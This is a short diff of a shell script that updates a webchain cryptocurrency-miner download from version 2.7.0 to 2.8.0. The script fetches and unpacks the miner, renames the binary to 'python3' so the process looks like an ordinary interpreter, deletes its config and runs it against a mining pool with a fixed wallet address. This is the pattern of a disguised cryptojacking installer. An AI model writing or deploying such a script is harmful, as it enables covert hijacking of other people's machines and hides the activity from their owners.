@@ -26,8 +26,8 @@ exit
 fi
 
 
-wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
-tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
+wget https://github.com/webchain-network/webchain-miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
 mv webchain-miner python3
 rm config.json
 ./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=0
